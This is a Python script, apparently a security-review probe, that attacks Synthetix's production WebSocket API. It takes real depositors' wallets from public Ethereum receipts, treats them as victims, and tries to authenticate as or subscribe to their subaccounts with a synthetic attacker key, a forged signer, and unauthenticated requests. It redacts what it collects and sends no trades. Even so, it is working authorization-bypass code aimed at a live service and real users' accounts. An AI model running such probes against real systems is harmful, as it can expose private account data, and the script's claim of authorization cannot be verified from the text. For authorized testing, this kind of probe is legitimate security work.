#!/usr/bin/env python3
"""Read-only WebSocket authentication and subscription binding probe.

The probe uses a deterministic, unfunded synthetic signer and public account
identifiers derived from public deposit receipts. It never sends a trading or
state-changing method and never stores raw wallet addresses, subaccount IDs,
positions, orders, balances, or event payloads.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from typing import Any

import websockets
from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_utils import to_checksum_address

OUT = pathlib.Path("ws_account_binding")
OUT.mkdir(parents=True, exist_ok=True)

PAPI_INFO = "https://papi.synthetix.io/v1/info"
WS_INFO = "wss://papi.synthetix.io/v1/ws/info"
WS_TRADE = "wss://papi.synthetix.io/v1/ws/trade"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
    "https://rpc.mevblocker.io",
    "https://eth.drpc.org",
)

# Recent public Deposit transactions for the in-scope custody proxy.
DEPOSIT_TX_HASHES = (
    "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
    "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
    "0xff49e1668459cf9d6740fa406bb6e1714495451614bf7a0cbba287fd012d0406",
    "0x2bcf6ce3cd19759da83c531db0c37756af79371e4acd0c5e94e870c0485cd0dc",
    "0x37e4ed3427007aa6c4f2d3297fd12b42b854ae55fae5b1203fac5406d9b170ec",
    "0x3768526db1bd1a128785882ad010ba415508d51ff11b603872fc7d45789ccfc8",
    "0x0c9bf25d6b94eec665034bccfe2e72132084f6e540eae6bdfd3f6f4db25d3f30",
)

ATTACKER_PRIVATE_KEY = "0x" + "66" * 32
ATTACKER = Account.from_key(ATTACKER_PRIVATE_KEY)
CORRUPT_KEY = Account.from_key("0x" + "67" * 32)
NONEXISTENT_SUBACCOUNT_ID = 999_999_999_999_999_983
MAX_BODY = 2 * 1024 * 1024
UA = "Mozilla/5.0 (compatible; authorized-read-only-security-review/1.0)"

DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
AUTH_TYPES = {
    "EIP712Domain": DOMAIN_FIELDS,
    "AuthMessage": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "timestamp", "type": "uint256"},
        {"name": "action", "type": "string"},
    ],
}
DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}


def digest(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes]:
    request = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read(MAX_BODY + 1)
            if len(body) > MAX_BODY:
                raise ValueError("response too large")
            return response.status, body
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(MAX_BODY + 1)


def rpc(method: str, params: list[Any]) -> Any:
    errors: list[str] = []
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    for url in RPC_URLS:
        try:
            status, body = post_json(url, payload)
            data = json.loads(body)
            if status >= 400 or "error" in data:
                error = data.get("error")
                code = error.get("code") if isinstance(error, dict) else None
                errors.append(f"status={status},code={code}")
                continue
            return data["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def parse_json(body: bytes) -> Any:
    try:
        return json.loads(body)
    except Exception:
        return None


def topic_address(topic: str) -> str:
    return to_checksum_address("0x" + topic[-40:])


def account_ids(wallet: str) -> dict[str, list[str]]:
    status, body = post_json(
        PAPI_INFO,
        {
            "params": {
                "action": "getSubAccountIds",
                "walletAddress": wallet,
                "includeDelegations": True,
            }
        },
    )
    data = parse_json(body)
    response = data.get("response") if isinstance(data, dict) else None
    result = {"owned": [], "delegated": [], "managed": []}
    if status == 200 and isinstance(data, dict) and data.get("status") == "ok":
        if isinstance(response, list):
            result["owned"] = [str(item) for item in response]
        elif isinstance(response, dict):
            result["owned"] = [str(item) for item in response.get("subAccountIds", []) or []]
            result["delegated"] = [str(item) for item in response.get("delegatedSubAccountIds", []) or []]
            result["managed"] = [str(item) for item in response.get("managedSubAccountIds", []) or []]
    return result


def discover_public_target() -> tuple[str, str, dict[str, Any]]:
    diagnostics: dict[str, Any] = {"receiptsChecked": 0, "depositEventsFound": 0, "accountLookups": 0}
    for tx_hash in DEPOSIT_TX_HASHES:
        diagnostics["receiptsChecked"] += 1
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if not isinstance(receipt, dict):
            continue
        for log in receipt.get("logs", []):
            topics = log.get("topics", [])
            if (
                str(log.get("address", "")).lower() != DEPOSIT_PROXY.lower()
                or len(topics) < 4
                or str(topics[0]).lower() != ASSET_DEPOSITED_TOPIC.lower()
            ):
                continue
            diagnostics["depositEventsFound"] += 1
            beneficiary = topic_address(topics[2])
            diagnostics["accountLookups"] += 1
            ids = account_ids(beneficiary)
            if ids["owned"]:
                return beneficiary, ids["owned"][0], diagnostics
    raise RuntimeError("No public deposit beneficiary with an owned subaccount was found")


def format_signature(signed: Any) -> str:
    return "0x" + format(signed.r, "064x") + format(signed.s, "064x") + format(signed.v, "02x")


def auth_material(subaccount_id: int, signer: Any = ATTACKER) -> tuple[dict[str, Any], str]:
    timestamp = int(time.time() * 1000)
    message = {
        "subAccountId": subaccount_id,
        "timestamp": timestamp,
        "action": "websocket_auth",
    }
    encoded = encode_typed_data(
        full_message={
            "types": {"AuthMessage": AUTH_TYPES["AuthMessage"]},
            "primaryType": "AuthMessage",
            "domain": DOMAIN,
            "message": message,
        }
    )
    signature = format_signature(signer.sign_message(encoded))
    payload = {
        "types": AUTH_TYPES,
        "primaryType": "AuthMessage",
        "domain": DOMAIN,
        "message": {
            "subAccountId": hex(subaccount_id),
            "timestamp": hex(timestamp),
            "action": "websocket_auth",
        },
    }
    return payload, signature


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 4:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(item, depth + 1) for key, item in sorted(value.items())}
    if isinstance(value, list):
        return {
            "type": "list",
            "count": len(value),
            "sample": schema(value[0], depth + 1) if value else None,
        }
    return type(value).__name__


def redact_message(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = re.sub(r"0x[a-fA-F0-9]{40}", "<address>", text)
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{5,}\b", "<number>", text)
    return text[:400]


def sanitize_message(raw: str) -> dict[str, Any]:
    parsed: Any
    try:
        parsed = json.loads(raw)
    except Exception:
        return {
            "json": False,
            "bytes": len(raw.encode()),
            "sha256": digest(raw),
        }
    error = parsed.get("error") if isinstance(parsed, dict) else None
    if isinstance(error, dict):
        error_code = error.get("code")
        error_message = error.get("message")
    else:
        error_code = None
        error_message = error
    result = parsed.get("result") if isinstance(parsed, dict) else None
    method = parsed.get("method") if isinstance(parsed, dict) else None
    return {
        "json": True,
        "bytes": len(raw.encode()),
        "sha256": digest(raw),
        "keys": sorted(parsed.keys()) if isinstance(parsed, dict) else None,
        "requestId": str(parsed.get("requestId")) if isinstance(parsed, dict) and parsed.get("requestId") is not None else None,
        "id": str(parsed.get("id")) if isinstance(parsed, dict) and parsed.get("id") is not None else None,
        "status": parsed.get("status") if isinstance(parsed, dict) else None,
        "method": method,
        "errorCode": error_code,
        "errorMessageRedacted": redact_message(error_message),
        "errorMessageSha256": digest(str(error_message)) if error_message is not None else None,
        "resultSchema": schema(result),
        "privatePush": method == "subAccountEvent",
    }


async def receive_window(ws: Any, seconds: float = 3.0, limit: int = 8) -> list[dict[str, Any]]:
    messages: list[dict[str, Any]] = []
    deadline = asyncio.get_running_loop().time() + seconds
    while len(messages) < limit:
        remaining = deadline - asyncio.get_running_loop().time()
        if remaining <= 0:
            break
        try:
            raw = await asyncio.wait_for(ws.recv(), timeout=remaining)
        except asyncio.TimeoutError:
            break
        except Exception as exc:  # noqa: BLE001
            messages.append({"receiveError": type(exc).__name__})
            break
        if isinstance(raw, bytes):
            raw = raw.decode("utf-8", errors="replace")
        messages.append(sanitize_message(raw))
    return messages


async def run_case(
    name: str,
    endpoint: str,
    subscription_id: str,
    auth_id: int | None = None,
    signer: Any = ATTACKER,
) -> dict[str, Any]:
    record: dict[str, Any] = {
        "name": name,
        "endpoint": endpoint.rsplit("/", 1)[-1],
        "authSubaccountSha256": digest(str(auth_id)) if auth_id is not None else None,
        "subscriptionSubaccountSha256": digest(subscription_id),
        "messages": [],
    }
    try:
        async with websockets.connect(
            endpoint,
            additional_headers={"User-Agent": UA},
            open_timeout=20,
            close_timeout=5,
            ping_interval=None,
            max_size=MAX_BODY,
        ) as ws:
            record["connected"] = True
            if auth_id is not None:
                payload, signature = auth_material(auth_id, signer)
                await ws.send(
                    json.dumps(
                        {
                            "id": "1",
                            "method": "auth",
                            "params": {"message": json.dumps(payload, separators=(",", ":")), "signature": signature},
                        },
                        separators=(",", ":"),
                    )
                )
                record["messages"].extend(await receive_window(ws, seconds=2.0, limit=4))
            await ws.send(
                json.dumps(
                    {
                        "id": "2",
                        "method": "subscribe",
                        "params": {"type": "subAccountUpdates", "sub_account_id": subscription_id},
                    },
                    separators=(",", ":"),
                )
            )
            record["messages"].extend(await receive_window(ws, seconds=3.5, limit=8))
    except Exception as exc:  # noqa: BLE001
        record["connected"] = record.get("connected", False)
        record["exceptionType"] = type(exc).__name__
        record["exceptionMessageRedacted"] = redact_message(exc)
    statuses = [item.get("status") for item in record["messages"] if isinstance(item, dict)]
    record["statusCodes"] = statuses
    record["privatePushReceived"] = any(item.get("privatePush") for item in record["messages"] if isinstance(item, dict))
    record["anySuccessStatus"] = any(status in (200, "200") for status in statuses)
    return record


async def main_async() -> dict[str, Any]:
    attacker_ids = account_ids(ATTACKER.address)
    attacker_count = sum(len(values) for values in attacker_ids.values())
    if attacker_count != 0:
        raise RuntimeError("Synthetic attacker unexpectedly has Synthetix account associations")

    beneficiary, victim_id, discovery = discover_public_target()
    victim_int = int(victim_id)

    cases = [
        await run_case(
            "trade_unauthenticated_foreign_subscription",
            WS_TRADE,
            victim_id,
        ),
        await run_case(
            "info_unauthenticated_private_subscription",
            WS_INFO,
            victim_id,
        ),
        await run_case(
            "trade_attacker_auth_claiming_foreign_account",
            WS_TRADE,
            victim_id,
            auth_id=victim_int,
        ),
        await run_case(
            "trade_attacker_auth_nonexistent_then_foreign_subscription",
            WS_TRADE,
            victim_id,
            auth_id=NONEXISTENT_SUBACCOUNT_ID,
        ),
        await run_case(
            "trade_attacker_auth_nonexistent_control",
            WS_TRADE,
            str(NONEXISTENT_SUBACCOUNT_ID),
            auth_id=NONEXISTENT_SUBACCOUNT_ID,
        ),
        await run_case(
            "trade_wrong_signer_signature_foreign_account",
            WS_TRADE,
            victim_id,
            auth_id=victim_int,
            signer=CORRUPT_KEY,
        ),
    ]

    foreign_cases = [item for item in cases if "foreign" in item["name"]]
    return {
        "safety": (
            "Read-only WebSocket auth/subscription messages only. No trading method, transaction, raw victim identity, "
            "subaccount ID, position, order, balance, or event payload is retained."
        ),
        "syntheticAttackerAddress": ATTACKER.address,
        "syntheticAttackerAccountCount": attacker_count,
        "victimBeneficiarySha256": digest(beneficiary.lower()),
        "victimSubaccountSha256": digest(victim_id),
        "discovery": discovery,
        "cases": cases,
        "unexpectedForeignPrivatePush": any(item["privatePushReceived"] for item in foreign_cases),
        "unexpectedForeignSuccessStatus": any(item["anySuccessStatus"] for item in foreign_cases),
    }


def main() -> None:
    try:
        summary = asyncio.run(main_async())
    except BaseException as exc:  # noqa: BLE001
        summary = {
            "safety": "No state-changing method was issued and no raw victim data was retained.",
            "probeCompleted": False,
            "failureType": type(exc).__name__,
            "failureMessageRedacted": redact_message(exc),
            "failureMessageSha256": digest(str(exc)),
        }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
